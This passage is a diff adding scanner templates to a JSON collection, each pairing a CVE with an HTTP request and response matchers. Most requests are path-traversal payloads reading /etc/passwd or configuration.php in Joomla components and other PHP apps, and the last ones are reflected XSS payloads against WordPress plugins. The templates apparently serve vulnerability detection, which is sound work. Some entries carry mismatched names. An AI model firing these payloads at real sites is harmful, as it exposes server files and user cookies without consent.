+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_graphics&controller=../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1657",
       "info": {
         "author": "daffainfo",
@@ -1973,6 +3034,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_smartsite&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1658",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Code-Garage NoticeBoard (com_noticeboard) component 1.3 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component NoticeBoard 1.3 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12427",
+          "https://www.cvedetails.com/cve/CVE-2010-1658"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_noticeboard&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2047,6 +3145,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_arcadegames&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1715",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Online Examination (aka Online Exam or com_onlineexam) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php. NOTE some of these details are obtained from third party information.",
+        "name": "Joomla! Component Online Exam 1.5.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12174",
+          "https://www.cvedetails.com/cve/CVE-2010-1715"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2274,6 +3409,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1873",
+      "info": {
+        "author": "daffainfo",
+        "description": "SQL injection vulnerability in the Jvehicles (com_jvehicles) component 1.0, 2.0, and 2.1111 for Joomla! allows remote attackers to execute arbitrary SQL commands via the aid parameter in an agentlisting action to index.php.",
+        "name": "Joomla! Component Jvehicles - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11997",
+          "https://www.cvedetails.com/cve/CVE-2010-1873"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1875",
       "info": {
         "author": "daffainfo",
@@ -2306,6 +3478,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_properties&controller=../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1878",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the OrgChart (com_orgchart) component 1.0.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component OrgChart 1.0.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12317",
+          "https://www.cvedetails.com/cve/CVE-2010-1878"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_orgchart&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2533,6 +3742,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1977",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the J!WHMCS Integrator (com_jwhmcs) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component J!WHMCS Integrator 1.5.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12083",
+          "https://www.cvedetails.com/cve/CVE-2010-1977"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jwhmcs&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1979",
       "info": {
         "author": "daffainfo",
@@ -2639,6 +3885,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1982",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JA Voice (com_javoice) component 2.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+        "name": "Joomla! Component JA Voice 2.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12121",
+          "https://www.cvedetails.com/cve/CVE-2010-1982"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2866,6 +4149,77 @@
       ]
     },
     {
+      "id": "CVE-2010-2045",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Dione Form Wizard (aka FDione or com_dioneformwizard) component 1.0.2 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+        "name": "Joomla! Component FDione Form Wizard 1.0.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12595",
+          "https://www.cvedetails.com/cve/CVE-2010-2045"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2050",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Moron Solutions MS Comment (com_mscomment) component 0.8.0b for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component MS Comment 0.8.0b - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12611\n- https://www.cvedetails.com/cve/CVE-2010-2050\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2122",
       "info": {
         "author": "daffainfo",
@@ -2898,6 +4252,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_simpledownload&task=download&fileid=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2128",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JE Quotation Form (com_jequoteform) component 1.0b1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the view parameter to index.php.",
+        "name": "Joomla! Component JE Quotation Form 1.0b1 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12607\n- https://www.cvedetails.com/cve/CVE-2010-2128\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jequoteform&view=../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2977,6 +4365,77 @@
       ]
     },
     {
+      "id": "CVE-2010-2507",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Picasa2Gallery (com_picasa2gallery) component 1.2.8 and earlier for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Picasa2Gallery 1.2.8 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/13981\n- https://www.cvedetails.com/cve/CVE-2010-2507\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2680",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JExtensions JE Section/Property Finder (jesectionfinder) component for Joomla! allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the view parameter to index.php.",
+        "name": "Joomla! Component jesectionfinder - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/14064",
+          "https://www.cvedetails.com/cve/CVE-2010-2680"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2682",
       "info": {
         "author": "daffainfo",
@@ -3009,6 +4468,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_realtyna&controller=../../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2857",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Music Manager component for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the cid parameter to album.html.",
+        "name": "Joomla! Component Music Manager - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/14274\n- https://www.cvedetails.com/cve/CVE-2010-2857\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/component/music/album.html?cid=../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -3054,6 +4547,43 @@
       ]
     },
     {
+      "id": "CVE-2010-2918",
+      "info": {
+        "author": "daffainfo",
+        "description": "PHP remote file inclusion vulnerability in core/include/myMailer.class.php in the Visites (com_joomla-visites) component 1.1 RC2 for Joomla! allows remote attackers to execute arbitrary PHP code via a URL in the mosConfig_absolute_path parameter.",
+        "name": "Joomla! Component Visites 1.1 - MosConfig_absolute_path Remote File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/31708",
+          "https://www.cvedetails.com/cve/CVE-2010-2918"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2920",
       "info": {
         "author": "daffainfo",
@@ -3086,6 +4616,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_foobla_suggestions&controller=../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-3203",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the PicSell (com_picsell) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the dflink parameter in a prevsell dwnfree action to index.php.",
+        "name": "Joomla! Component PicSell 1.0 - Local File Disclosure",
+        "reference": "- https://www.exploit-db.com/exploits/14845\n- https://www.cvedetails.com/cve/CVE-2010-3203\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php"
           ]
         }
       ]
@@ -3165,6 +4729,43 @@
       ]
     },
     {
+      "id": "CVE-2010-4282",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in Pandora FMS before 3.1.1 allow remote attackers to include and execute arbitrary local files via (1) the page parameter to ajax.php or (2) the id parameter to general/pandora_help.php, and allow remote attackers to include and execute, create, modify, or delete arbitrary local files via (3) the layout parameter to operation/agentes/networkmap.php.",
+        "name": "phpShowtime 2.0 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/15643",
+          "https://www.cvedetails.com/cve/CVE-2010-4282"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,lfi,joomla"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/pandora_console/ajax.php?page=../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-4617",
       "info": {
         "author": "daffainfo",
@@ -3197,6 +4798,154 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-4719",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in JRadio (com_jradio) component before 1.5.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+        "name": "Joomla! Component JRadio - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/15749",
+          "https://www.cvedetails.com/cve/CVE-2010-4719"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jradio&controller=../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-4769",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Jimtawl (com_jimtawl) component 1.0.2 Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the task parameter to index.php.",
+        "name": "Joomla! Component Jimtawl 1.0.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/15585",
+          "https://www.cvedetails.com/cve/CVE-2010-4769"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-4977",
+      "info": {
+        "author": "daffainfo",
+        "description": "SQL injection vulnerability in menu.php in the Canteen (com_canteen) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the mealid parameter to index.php.",
+        "name": "Joomla! Component Canteen 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/34250",
+          "https://www.cvedetails.com/cve/CVE-2010-4977"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_canteen&controller=../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-5028",
+      "info": {
+        "author": "daffainfo",
+        "description": "SQL injection vulnerability in the JExtensions JE Job (com_jejob) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the catid parameter in an item action to index.php.",
+        "name": "Joomla! Component JE Job 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12601",
+          "https://www.cvedetails.com/cve/CVE-2010-5028"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jejob&view=../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -3238,6 +4987,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-5286",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in Jstore (com_jstore) component for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Jstore - 'Controller' Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/34837",
+          "https://www.cvedetails.com/cve/CVE-2010-5286"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -3314,6 +5100,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2011-2744",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in Chyrp 2.1 and earlier allows remote attackers to include and execute arbitrary local files via a ..%2F (encoded dot dot slash) in the action parameter to the default URI.",
+        "name": "Chyrp 2.x - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/35945",
+          "https://www.cvedetails.com/cve/CVE-2011-2744"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2011,lfi,chyrp"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00"
           ]
         }
       ]
@@ -3899,6 +5722,43 @@
       ]
     },
     {
+      "id": "CVE-2012-0981",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in phpShowtime 2.0 allows remote attackers to list arbitrary directories and image files via a .. (dot dot) in the r parameter to index.php.",
+        "name": "phpShowtime 2.0 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/18435",
+          "https://www.cvedetails.com/cve/CVE-2012-0981"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2012,lfi,phpshowtime"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?r=i/../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-0991",
       "info": {
         "author": "daffainfo",
@@ -3931,6 +5791,80 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/contrib/acog/print_form.php?formname=../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-0996",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in 11in1 1.2.1 stable 12-31-2011 allow remote attackers to read arbitrary files via a .. (dot dot) in the class parameter to (1) index.php or (2) admin/index.php.",
+        "name": "11in1 CMS 1.2.1 - Local File Inclusion (LFI)",
+        "reference": [
+          "https://www.exploit-db.com/exploits/36784",
+          "https://www.cvedetails.com/cve/CVE-2012-0996"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2012,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?class=../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-1226",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in Dolibarr CMS 3.2.0 Alpha allow remote attackers to read arbitrary files and possibly execute arbitrary code via a .. (dot dot) in the (1) file parameter to document.php or (2) backtopage parameter in a create action to comm/action/fiche.php.",
+        "name": "Dolibarr ERP/CRM 3.2 Alpha - Multiple Directory Traversal Vulnerabilities",
+        "reference": [
+          "https://www.exploit-db.com/exploits/36873",
+          "https://www.cvedetails.com/cve/CVE-2012-1226"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2012,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/document.php?modulepart=project&file=../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -4850,6 +6784,43 @@
       ]
     },
     {
+      "id": "CVE-2014-10037",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in DomPHP 0.83 and earlier allows remote attackers to have unspecified impact via a .. (dot dot) in the url parameter to photoalbum/index.php.",
+        "name": "DomPHP 0.83 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/30865",
+          "https://www.cvedetails.com/cve/CVE-2014-10037"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2014,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/photoalbum/index.php?urlancien=&url=../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-2321",
       "info": {
         "author": "geeknik",
@@ -5314,6 +7285,54 @@
       ]
     },
     {
+      "id": "CVE-2014-4539",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2014-4539",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Cross-site scripting (XSS) vulnerability in the Movies plugin 0.6 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.",
+        "name": "Movies <= 0.6 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "- https://wpscan.com/vulnerability/d6ea4fe6-c486-415d-8f6d-57ea2f149304\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4539\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "'><script>alert(document.cookie)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-4544",
       "info": {
         "author": "daffainfo",
@@ -5365,6 +7384,198 @@
       ]
     },
     {
+      "id": "CVE-2014-4550",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2014-4550",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Cross-site scripting (XSS) vulnerability in preview-shortcode-external.php in the Shortcode Ninja plugin 1.4 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the shortcode parameter.",
+        "name": "Shortcode Ninja <= 1.4 - Unauthenticated Reflected XSS",
+        "reference": "- https://wpscan.com/vulnerability/c7c24c7d-5341-43a6-abea-4a50fce9aab0\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4550\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "'><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
